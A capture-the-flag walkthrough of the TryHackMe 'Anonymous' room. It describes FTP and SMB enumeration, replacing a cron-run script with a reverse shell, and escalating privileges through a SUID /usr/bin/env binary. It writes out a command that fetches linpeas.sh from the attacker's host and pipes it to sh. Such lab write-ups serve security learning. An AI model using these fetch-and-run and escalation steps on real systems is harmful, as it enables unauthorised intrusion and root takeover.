# This is a Writeup for the Room Anonymous on http://tryhackme.com 

### Enumeration

First we use nmap to see which ports are open and which services are running on them.

[![https://imgur.com/3KHpnMu.png](https://imgur.com/3KHpnMu.png)](https://imgur.com/3KHpnMu.png)

The first thing that catches our eye is the possibility to log into FTP anonymously which also hints to the room name so lets try that.

[![https://imgur.com/NSv0ZJ1.png](https://imgur.com/NSv0ZJ1.png)](https://imgur.com/NSv0ZJ1.png)

Lets discover which files we can find on the ftp server:

[![https://imgur.com/IyxL5jx.png](https://imgur.com/IyxL5jx.png)](https://imgur.com/IyxL5jx.png)

and use the get command to download the files.

The only interesting file we found is this bash script:

![Imgur](https://i.imgur.com/FS6sPPw.png) 

i am sure we can exploit it but lets first explore other options, we will find out later on.

Lets try to enumerate the SMB shares on Port 139 and 445

For this we can use the tool Enum4Linux which is pretty handy.

The usage is straight forward: 
enum4linux targetIP

We found a SMB share called pics.

![Imgur](https://i.imgur.com/ayu97kS.png)

Lets try to loginto that with the smbclient.

You can do that with the command:
smbclient \\\\targetip\\share -u anonymous
and no password.
There are only 2 pictures on the smbshare so we go back and explore the bash script in more detail.

It looks like a cronjob, so lets try if we can not only download but also upload files to ftp?

It works! 

So our next step are the following:
Download the clean.sh script, 

hide a command for a reverseshell inside 
(Place to find a reverseshell https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[![https://imgur.com/MYn1gRG.png](https://imgur.com/MYn1gRG.png)](https://imgur.com/MYn1gRG.png)

and replace the one on the ftp server with ours.

[![https://imgur.com/od1He2e.png](https://imgur.com/od1He2e.png)](https://imgur.com/od1He2e.png)

Now we only need to setup a nc listener and wait a bit, we are in!

[![https://imgur.com/cr43x7b.png](https://imgur.com/cr43x7b.png)](https://imgur.com/cr43x7b.png)

First lets get a better shell and then escalate our privileges!

We can use python for that: python -c 'import pty; pty.spawn("/bin/bash")'

### Privilege Escalation

Lets make our life easier by setting up a http server on my host machine and curl linpeas.sh on the target.

[![https://imgur.com/32WBOx6.png](https://imgur.com/32WBOx6.png)](https://imgur.com/32WBOx6.png)

With the command:

curl http://your_ip:8000/linpeas.sh | sh you can get linpeas.sh and execute it.

(Of course you need to download it first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

We find that /usr/bin/env has the SUID binary bit set so we can check that on GTFOBINs (https://gtfobins.github.io/)

[![https://imgur.com/QhNXV9u.png](https://imgur.com/QhNXV9u.png)](https://imgur.com/QhNXV9u.png)

[![https://imgur.com/LwpJgWs.png](https://imgur.com/LwpJgWs.png)](https://imgur.com/LwpJgWs.png)

Now we can abuse it to escalate.

[![https://imgur.com/RinrpKl.png](https://imgur.com/RinrpKl.png)](https://imgur.com/RinrpKl.png)

In hindsight linpeas was maybe a bit overkill we could have also checked for SUID's manually with:

find / -perm /4000 -type f 2>/dev/null

Thank you for reading :)
